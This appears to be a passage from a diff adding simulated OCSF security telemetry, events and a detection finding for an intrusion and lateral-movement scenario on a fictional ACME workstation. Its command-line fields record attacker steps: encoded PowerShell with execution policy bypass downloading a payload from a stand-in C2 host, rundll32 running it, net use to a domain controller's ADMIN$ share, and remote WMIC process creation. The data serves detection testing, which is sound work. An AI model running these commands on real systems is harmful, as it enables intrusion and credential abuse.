+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:3116:1778773200000",
+      "pid": 3116,
+      "name": "explorer.exe",
+      "cmd_line": "C:\\Windows\\Explorer.EXE",
+      "created_time": 1778773200000,
+      "file": {
+        "name": "explorer.exe",
+        "path": "C:\\Windows\\explorer.exe",
+        "parent_folder": {
+          "path": "C:\\Windows"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "Medium",
+      "parent_process": null
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION",
+    "actual_permissions": "PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "rundll32.exe",
+        "record_id": "procname:rundll32.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "explorer.exe",
+        "record_id": "procname:explorer.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "C:\\Windows\\Explorer.EXE",
+        "record_id": "cmd:3116"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\explorer.exe",
+        "record_id": "file:C:\\Windows\\explorer.exe"
+      },
+      {
+        "name": "module.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\ProgramData\\WinCache\\updater.dat",
+        "record_id": "module-file"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0006\", \"scenario\": \"external compromise and lateral movement\"}",
+    "injection_type": "Other",
+    "injection_type_id": 99,
+    "module": {
+      "name": "updater.dat",
+      "file": {
+        "name": "updater.dat",
+        "path": "C:\\ProgramData\\WinCache\\updater.dat",
+        "parent_folder": {
+          "path": "C:\\ProgramData\\WinCache"
+        },
+        "size": 74240,
+        "hashes": [
+          {
+            "algorithm": "MD5",
+            "algorithm_id": 1,
+            "value": "4d186321c1a7f0f354b297e8914ab240"
+          },
+          {
+            "algorithm": "SHA-256",
+            "algorithm_id": 3,
+            "value": "0f4c2d2e9b5f17b416bfa0b917f6cce0e8d4a4ad5fd5fa3f7db6e8d1c4aa8011"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Create",
+    "category_uid": 2,
+    "category_name": "Findings",
+    "class_uid": 2004,
+    "class_name": "Detection Finding",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774460000,
+    "timezone_offset": -420,
+    "type_uid": 200401,
+    "type_name": "Detection Finding: Create",
+    "message": "Initial compromise: SMB exploit followed by encoded PowerShell payload download",
+    "metadata": {
+      "uid": "meta-find-0007",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-xdr-correlation",
+        "name": "ACME XDR Correlation Engine",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Detection Engine",
+          "uid": "xdr-detect"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774461000,
+      "event_code": "detection_finding",
+      "correlation_uid": "corr-attack-chain-20260514-WS-FIN-023"
+    },
+    "status_id": 1,
+    "status": "New",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "finding_info": {
+      "uid": "finding-0007",
+      "title": "Initial compromise: SMB exploit followed by encoded PowerShell payload download",
+      "desc": "An external SMB connection to WS-FIN-023 was followed by suspicious service-spawned cmd.exe, encoded PowerShell, outbound HTTPS to C2, rundll32 payload execution and process injection.",
+      "created_time": 1778774460000,
+      "first_seen_time": 1778774402000,
+      "last_seen_time": 1778774444000,
+      "modified_time": 1778774460000,
+      "product_uid": "product:acme-xdr-correlation",
+      "types": [
+        "Endpoint Detection",
+        "Correlation"
+      ],
+      "related_events": [
+        {
+          "uid": "meta-net-0001",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0002",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0003",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-net-0004",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0005",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0006",
+          "type": "OCSF Event"
+        }
+      ],
+      "attacks": [
+        {
+          "uid": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "tactic": {
+            "uid": "TA0001",
+            "name": "Initial Access"
+          }
+        },
+        {
+          "uid": "T1059.001",
+          "name": "PowerShell",
+          "tactic": {
+            "uid": "TA0002",
+            "name": "Execution"
+          }
+        },
+        {
+          "uid": "T1055",
+          "name": "Process Injection",
+          "tactic": {
+            "uid": "TA0005",
+            "name": "Defense Evasion"
+          }
+        }
+      ]
+    },
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "resources": [
+      {
+        "uid": "asset:acme:ws-fin-023",
+        "name": "WS-FIN-023.acme.local",
+        "type": "Device",
+        "region": "on-prem",
+        "data": {
+          "uid": "asset:acme:ws-fin-023",
+          "name": "WS-FIN-023",
+          "hostname": "WS-FIN-023.acme.local",
+          "ip": "10.10.20.25",
+          "mac": "00:50:56:AA:20:25",
+          "type": "Desktop",
+          "type_id": 2,
+          "os": {
+            "name": "Microsoft Windows 11 Pro",
+            "type": "Windows",
+            "type_id": 100,
+            "version": "23H2",
+            "build": "22631.3593"
+          },
+          "domain": "ACME",
+          "org": {
+            "uid": "tenant:acme-corp",
+            "name": "ACME-CORP"
+          }
+        }
+      },
+      {
+        "uid": "resource:external-ip:203.0.113.45",
+        "name": "203.0.113.45",
+        "type": "IP Address",
+        "data": {
+          "ip": "203.0.113.45"
+        }
+      },
+      {
+        "uid": "resource:c2:198.51.100.77",
+        "name": "cdn-update.example.net",
+        "type": "Network Infrastructure",
+        "data": {
+          "ip": "198.51.100.77",
+          "hostname": "cdn-update.example.net",
+          "port": 443,
+          "type": "Server",
+          "type_id": 1,
+          "location": {
+            "country": "ZZ",
+            "desc": "Example C2 infrastructure"
+          }
+        }
+      }
+    ],
+    "evidences": [
+      {
+        "uid": "evidence:finding-0007:1",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0001"
+        }
+      },
+      {
+        "uid": "evidence:finding-0007:2",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0002"
+        }
+      },
+      {
+        "uid": "evidence:finding-0007:3",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0003"
+        }
+      },
+      {
+        "uid": "evidence:finding-0007:4",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0004"
+        }
+      },
+      {
+        "uid": "evidence:finding-0007:5",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0005"
+        }
+      },
+      {
+        "uid": "evidence:finding-0007:6",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0006"
+        }
+      }
+    ],
+    "confidence": "High",
+    "confidence_id": 3,
+    "confidence_score": 92,
+    "risk_level": "Critical",
+    "risk_level_id": 5,
+    "risk_score": 96,
+    "impact": "Endpoint compromise and credential exposure risk",
+    "impact_id": 4,
+    "impact_score": 88,
+    "is_alert": true,
+    "start_time": 1778774402000,
+    "end_time": 1778774444000,
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "device.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "device.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "203.0.113.45",
+        "record_id": "203.0.113.45"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      }
+    ],
+    "vendor_attributes": {
+      "kill_chain_stage": "initial-access",
+      "scenario_id": "sim-acme-pivot-001",
+      "correlation_rule_uid": "rule:sim:ocsf:pivot-lateral-movement"
+    },
+    "malware": [
+      {
+        "name": "Simulated.Win32.Loader",
+        "classification": "Trojan Loader",
+        "classification_id": 2
+      }
+    ],
+    "remediation": {
+      "desc": "Isolate WS-FIN-023, collect memory image, block 203.0.113.45 and 198.51.100.77, reset ACME\\j.smith credentials."
+    }
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 4,
+    "severity": "High",
+    "time": 1778774648000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "Compromised host used net.exe to connect to DC-01 ADMIN$ share with user credentials.",
+    "metadata": {
+      "uid": "meta-proc-0008",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774649200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4720:1778774648000",
+      "pid": 4720,
+      "name": "net.exe",
+      "cmd_line": "net.exe use \\\\10.10.10.5\\ADMIN$ /user:ACME\\j.smith ********",
+      "created_time": 1778774648000,
+      "file": {
+        "name": "net.exe",
+        "path": "C:\\Windows\\System32\\net.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "rundll32.exe",
+        "record_id": "procname:rundll32.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "net.exe",
+        "record_id": "procname:net.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "net.exe use \\\\10.10.10.5\\ADMIN$ /user:ACME\\j.smith ********",
+        "record_id": "cmd:4720"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\net.exe",
+        "record_id": "file:C:\\Windows\\System32\\net.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0008\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Open",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 4,
+    "severity": "High",
+    "time": 1778774650000,
+    "timezone_offset": -420,
+    "type_uid": 400101,
+    "type_name": "Network Activity: Open",
+    "message": "Compromised workstation opened SMB connection to domain controller ADMIN$ share.",
+    "metadata": {
+      "uid": "meta-net-0009",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774651500
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 49902,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "dst_endpoint": {
+      "ip": "10.10.10.5",
+      "port": 445,
+      "hostname": "DC-01.acme.local",
+      "mac": "00:50:56:AA:10:05",
+      "type": "Server",
+      "type_id": 1
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:10.10.20.25:49902:10.10.10.5:445:20260514T160410Z",
+      "direction": "Outbound",
+      "direction_id": 2,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "smb",
+    "app_name": "SMB",
+    "traffic": {
+      "bytes_in": 19321,
+      "bytes_out": 88490,
+      "packets_in": 81,
+      "packets_out": 126
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.10.5",
+        "record_id": "10.10.10.5"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "445",
+        "record_id": "dst_endpoint.port:445"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:10.10.20.25:49902:10.10.10.5:445:20260514T160410Z\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774681000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "Compromised host launched WMIC to create a remote process on DC-01.",
+    "metadata": {
+      "uid": "meta-proc-0010",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774682200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4824:1778774681000",
+      "pid": 4824,
+      "name": "wmic.exe",
+      "cmd_line": "wmic.exe /node:10.10.10.5 process call create \"cmd.exe /c whoami > C:\\Windows\\Temp\\wmi.out\"",
+      "created_time": 1778774681000,
+      "file": {
+        "name": "wmic.exe",
+        "path": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32\\wbem"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
